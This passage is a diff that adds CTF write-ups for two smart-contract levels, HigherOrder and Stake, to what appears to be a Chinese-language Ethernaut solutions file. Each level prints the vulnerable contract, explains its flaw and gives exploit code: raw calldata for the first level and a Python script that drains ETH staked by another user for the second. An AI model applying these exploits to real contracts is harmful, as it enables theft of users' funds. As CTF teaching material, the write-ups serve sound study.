@@ -2619,3 +2619,155 @@ contract Switch {
 ```bash
 $ cast send <contract-address> --private-key <key> --rpc-url <rpc-url> 0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000 
 ```
+
+## 30. HigherOrder
+
+Your objective is to become the Commander of the Higher Order!
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity 0.6.12;
+
+contract HigherOrder {
+    address public commander;
+
+    uint256 public treasury;
+
+    function registerTreasury(uint8) public {
+        assembly {
+            sstore(treasury_slot, calldataload(4))
+        }
+    }
+
+    function claimLeadership() public {
+        if (treasury > 255) commander = msg.sender;
+        else revert("Only members of the Higher Order can become Commander");
+    }
+}
+```
+
+- `treasury` 的值大于 255 即可成为 `commander`
+- `registerTreasury()` 可以设置 `treasury` 的值，尽管函数本身限制了参数类型，但使用了 `calldataload()` 来加载调用参数
+- `calldataload(4)` 获取调用数据从第 4 字节开始 32 字节的数据，因此调用 `registerTreasury()` 时传入任意大于 255 的数据即可
+
+  ```js
+  // registerTreasury(uint8): 0x211c85ab
+  >> await contract.sendTransaction({data: "211c85abff00000000000000000000000000000000000000000000000000000000000000"})
+  >> await contract.claimLeadership()
+  ```
+
+### 参考资料
+
+- [Yul — Solidity documentation](https://docs.soliditylang.org/en/latest/yul.html)
+
+## 31. Stake
+
+To complete this level, the contract state must meet the following conditions:
+
+- The `Stake` contract's ETH balance has to be greater than 0
+- `totalStaked` must be greater than the `Stake` contract's ETH balance
+- You must be a staker
+- Your staked balance must be 0
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+contract Stake {
+
+    uint256 public totalStaked;
+    mapping(address => uint256) public UserStake;
+    mapping(address => bool) public Stakers;
+    address public WETH;
+
+    constructor(address _weth) payable{
+        totalStaked += msg.value;
+        WETH = _weth;
+    }
+
+    function StakeETH() public payable {
+        require(msg.value > 0.001 ether, "Don't be cheap");
+        totalStaked += msg.value;
+        UserStake[msg.sender] += msg.value;
+        Stakers[msg.sender] = true;
+    }
+    function StakeWETH(uint256 amount) public returns (bool){
+        require(amount >  0.001 ether, "Don't be cheap");
+        (,bytes memory allowance) = WETH.call(abi.encodeWithSelector(0xdd62ed3e, msg.sender,address(this)));
+        require(bytesToUint(allowance) >= amount,"How am I moving the funds honey?");
+        totalStaked += amount;
+        UserStake[msg.sender] += amount;
+        (bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender,address(this),amount));
+        Stakers[msg.sender] = true;
+        return transfered;
+    }
+
+    function Unstake(uint256 amount) public returns (bool){
+        require(UserStake[msg.sender] >= amount,"Don't be greedy");
+        UserStake[msg.sender] -= amount;
+        totalStaked -= amount;
+        (bool success, ) = payable(msg.sender).call{value : amount}("");
+        return success;
+    }
+    function bytesToUint(bytes memory data) internal pure returns (uint256) {
+        require(data.length >= 32, "Data length must be at least 32 bytes");
+        uint256 result;
+        assembly {
+            result := mload(add(data, 0x20))
+        }
+        return result;
+    }
+}
+```
+
+- 用户成为质押者之后身份不会被取消
+- 通过 `StakeWETH()` 可以使 `totalStaked` 增加而不影响合约 `Stake` 的余额，另外，采用了低级调用来调用 `WETH` 的 `transferFrom()` 且没有检查返回值
+- `Unstake()` 只能取出合约中的以太，同样未检查低级调用的返回值
+- 要同时满足用户质押数量为 0 且 `totalStaked` 要大于合约 `Stake` 的余额，需要另一个用户通过 `StakeETH()` 质押以太币。而用户使用 `StakeWETH()` 可以在不持有 `WETH` 的情况下增加 `totalStaked` 和 `UserStake[msg.sender]`，最后使用 `Unstake()` 取出其他用户质押的以太币并清空质押
+
+### Exploit
+
+```py
+from cheb3 import Connection
+from cheb3.utils import compile_sol
+
+source = '''
+interface IStake {
+    function WETH() external view returns (address);
+    function StakeETH() external payable;
+    function StakeWETH(uint256 amount) external returns (bool);
+    function Unstake(uint256 amount) external returns (bool);
+}
+
+interface IWETH {
+    function approve(address spender, uint amount) external;
+}
+
+contract Helper {
+    function stake(address _stake) payable external {
+        IStake(_stake).StakeETH{value: msg.value}();
+    }
+}
+'''
+
+compiled = compile_sol(source, solc_version="0.8.0")
+helper_abi, helper_bin = compiled["Helper"]
+stake_abi, _ = compiled["IStake"]
+weth_abi, _ = compiled["IWETH"]
+
+conn = Connection("<rpc-url>")
+account = conn.account("<private-key>")
+stake_addr = "<instance>"
+
+helper = conn.contract(account, abi=helper_abi, bytecode=helper_bin)
+helper.deploy()
+
+helper.functions.stake(stake_addr).send_transaction(value = int(1e16) + 1)
+
+stake = conn.contract(account, abi=stake_abi, address=stake_addr)
+weth_addr = stake.caller.WETH()
+weth = conn.contract(account, abi=weth_abi, address=weth_addr)
+
+weth.functions.approve(stake_addr, int(1e18)).send_transaction()
+stake.functions.StakeWETH(int(1e16)).send_transaction()
+stake.functions.Unstake(int(1e16)).send_transaction()
+```
